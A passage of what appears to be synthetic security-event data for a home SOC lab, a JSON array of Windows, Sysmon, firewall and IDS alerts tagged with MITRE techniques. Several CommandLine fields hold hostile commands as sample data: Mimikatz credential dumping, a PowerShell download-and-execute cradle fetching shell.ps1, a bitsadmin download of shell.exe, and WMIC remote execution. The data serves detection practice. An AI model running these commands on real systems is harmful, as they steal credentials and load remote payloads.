  {
    "TimeGenerated": "2026-04-24T05:38:37.663075",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "john.doe",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T21:03:37.666028",
    "EventType": "WMI Remote Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "praharsh.admin",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1047",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": "wmic /node:TARGET process call create cmd.exe",
    "ProcessName": "wmiprvse.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T09:34:37.668996",
    "EventType": "IDS Alert",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.103",
    "DestinationIP": "91.234.56.78",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T08:43:37.661640",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-22T17:44:37.665041",
    "EventType": "Port Scan Detected",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1046",
    "LogSource": "Firewall / IDS",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Nmap"
  },
  {
    "TimeGenerated": "2026-04-23T01:19:37.668938",
    "EventType": "IDS Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.103",
    "DestinationIP": "91.234.56.78",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T03:21:37.663228",
    "EventType": "Sysmon Process Create",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "mimikatz.exe sekurlsa::logonpasswords",
    "ProcessName": "mimikatz.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T05:02:37.668210",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "77.73.133.84",
    "DestinationIP": "192.168.56.103",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T12:44:37.667785",
    "EventType": "Ransomware Activity",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "DEV-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1486",
    "LogSource": "Sysmon / EDR",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T00:41:37.669289",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T07:59:37.660221",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "KALI-LAB-01",
    "SourceIP": "185.220.101.45",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T07:23:37.664572",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "attacker",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell Invoke-Mimikatz",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T08:28:37.667855",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T02:55:37.665261",
    "EventType": "Privilege Escalation",
    "Severity": "Critical",
    "EventCode": 4672,
    "UserAccount": "svc.backup",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1068",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T07:59:37.665551",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "jane.smith",
    "Computer": null,
    "SourceIP": "192.168.56.102",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T00:18:37.664511",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell Invoke-Mimikatz",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T15:10:37.661715",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-23T02:20:37.666936",
    "EventType": "Data Exfiltration Suspected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": "185.220.101.45",
    "MitreTechnique": "T1048",
    "LogSource": "Firewall",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T08:11:37.669043",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T03:10:37.663926",
    "EventType": "Sysmon File Create",
    "Severity": "Medium",
    "EventCode": 11,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1105",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "regsvr32.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T06:56:37.662473",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "splunk",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-20T16:51:37.663562",
    "EventType": "Sysmon Network Connection",
    "Severity": "High",
    "EventCode": 3,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "23.129.64.100",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "bitsadmin.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T04:42:37.669375",
    "EventType": "Wazuh Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T22:56:37.660685",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "dev.engineer",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.103",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T01:30:37.668424",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.102",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T19:49:37.663856",
    "EventType": "Sysmon File Create",
    "Severity": "Medium",
    "EventCode": 11,
    "UserAccount": "svc.backup",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1105",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "wscript.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T08:26:37.659469",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "praharsh.admin",
    "Computer": "KALI-LAB-01",
    "SourceIP": "10.0.2.10",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T08:44:37.669551",
    "EventType": "Wazuh Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T03:40:37.665726",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "svc.backup",
    "Computer": null,
    "SourceIP": "192.168.56.103",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T20:43:37.662486",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "admin",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-20T16:13:37.663889",
    "EventType": "Sysmon File Create",
    "Severity": "Medium",
    "EventCode": 11,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1105",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "msiexec.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T17:14:37.660566",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "attacker",
    "Computer": "DEV-SERVER-01",
    "SourceIP": "10.0.2.10",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T21:46:37.661666",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-20T16:18:37.661586",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-23T03:12:37.669158",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T10:16:37.668502",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "194.165.16.11",
    "DestinationIP": "10.0.2.10",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T16:03:37.668570",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.102",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T13:40:37.663057",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "svc.backup",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T18:00:37.666013",
    "EventType": "WMI Remote Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1047",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": "wmic /node:TARGET process call create cmd.exe",
    "ProcessName": "wmiprvse.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T13:33:37.660389",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "svc.splunk",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "185.220.101.45",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T10:50:37.668871",
    "EventType": "IDS Alert",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "172.16.0.100",
    "DestinationIP": "45.67.22.10",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T11:48:37.669395",
    "EventType": "Wazuh Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T18:41:37.664739",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "dev.engineer",
    "Computer": "KALI-LAB-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell -c (New-Object Net.WebClient).DownloadFile",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T04:38:37.663415",
    "EventType": "Sysmon Network Connection",
    "Severity": "High",
    "EventCode": 3,
    "UserAccount": "john.doe",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "23.129.64.100",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "regsvr32.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T02:05:37.669052",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T04:31:37.661605",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-22T01:03:37.664664",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "svc.backup",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell Invoke-Mimikatz",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T15:47:37.665050",
    "EventType": "Port Scan Detected",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1046",
    "LogSource": "Firewall / IDS",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Nmap"
  },
  {
    "TimeGenerated": "2026-04-21T21:01:37.667121",
    "EventType": "Credential Dumping",
    "Severity": "Critical",
    "EventCode": 10,
    "UserAccount": "attacker",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon Event ID 10",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": "procdump.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T03:43:37.667479",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "KALI-LAB-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Ryuk.Ransomware",
    "FileHash": "a1b2c3d4e5f6789012345678abcdef01",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T06:59:37.668602",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "45.67.22.10",
    "DestinationIP": "192.168.56.103",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T02:37:37.668006",
    "EventType": "Impossible Travel",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "finance.user",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1078.004",
    "LogSource": "Azure AD / Okta",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T13:01:37.667322",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "DEV-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Emotet",
    "FileHash": "0123456789abcdef0123456789abcdef",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T11:39:37.662558",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "admin",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-24T07:49:37.662371",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "admin",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-22T03:12:37.664394",
    "EventType": "Reverse Shell Detected",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1059.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.104:8080/shell.ps1')",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Metasploit / Netcat"
  },
  {
    "TimeGenerated": "2026-04-19T19:35:37.667824",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T09:56:37.667832",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T14:45:37.664913",
    "EventType": "LOLBIN Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "dev.engineer",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1218",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "bitsadmin /transfer job /download /priority normal http://192.168.56.104/shell.exe",
    "ProcessName": "msiexec.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T02:17:37.666844",
    "EventType": "Data Exfiltration Suspected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": "185.220.101.45",
    "MitreTechnique": "T1048",
    "LogSource": "Firewall",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T17:23:37.662220",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-21T10:37:37.665294",
    "EventType": "Privilege Escalation",
    "Severity": "Critical",
    "EventCode": 4672,
    "UserAccount": "svc.splunk",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1068",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T06:54:37.668590",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "103.45.78.21",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
